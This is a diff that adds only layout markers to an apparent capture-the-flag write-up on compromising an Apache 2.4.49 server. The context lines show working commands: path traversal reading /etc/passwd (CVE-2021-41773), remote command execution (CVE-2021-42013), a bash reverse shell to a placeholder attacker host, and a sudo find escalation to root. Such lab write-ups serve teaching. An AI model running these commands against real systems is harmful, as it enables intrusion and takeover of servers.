@@ -14,6 +14,7 @@ image:
 ```bash
 nmap -sC -sV -p8080 <TARGET_IP>
 ```
+{: .ms-4 }
 Banner confirms Apache/2.4.49 on port 8080.
 
 ## Phase 2 — Path Traversal (CVE-2021-41773)
@@ -21,6 +22,7 @@ Confirm the traversal vulnerability by reading a known file:
 ```bash
 curl -s --path-as-is "http://<TARGET_IP>:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
 ```
+{: .ms-4 }
 
 ## Phase 3 — RCE (CVE-2021-42013)
 Because mod_cgi is enabled, escalate the traversal into command execution:
@@ -28,6 +30,7 @@ Because mod_cgi is enabled, escalate the traversal into command execution:
 curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' \
 'http://<TARGET_IP>:8080/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
 ```
+{: .ms-4 }
 **Note:** Use a public exploit script (e.g. cnvd-2021-*, or the classic Metasploit module apache_normalize_path_rce) for a clean reverse shell.
 
 ## Phase 4 — Shell & User Flag
@@ -36,20 +39,24 @@ nc -lvnp 4444
 # trigger reverse shell via the same RCE technique, payload = bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
 cat /var/www/user.txt
 ```
+{: .ms-4 }
 
 ## Phase 5 — PrivEsc (sudo find NOPASSWD)
 ```bash
 sudo -l
 ```
+{: .ms-4 }
 www-data can run `/usr/bin/find` as root with no password — classic GTFOBins escalation:
 ```bash
 sudo find . -exec /bin/sh \; -quit
 ```
+{: .ms-4 }
 
 ## Phase 6 — Root Flag
 ```bash
 cat /root/root.txt
 ```
+{: .ms-4 }
 
 ## Flags
 
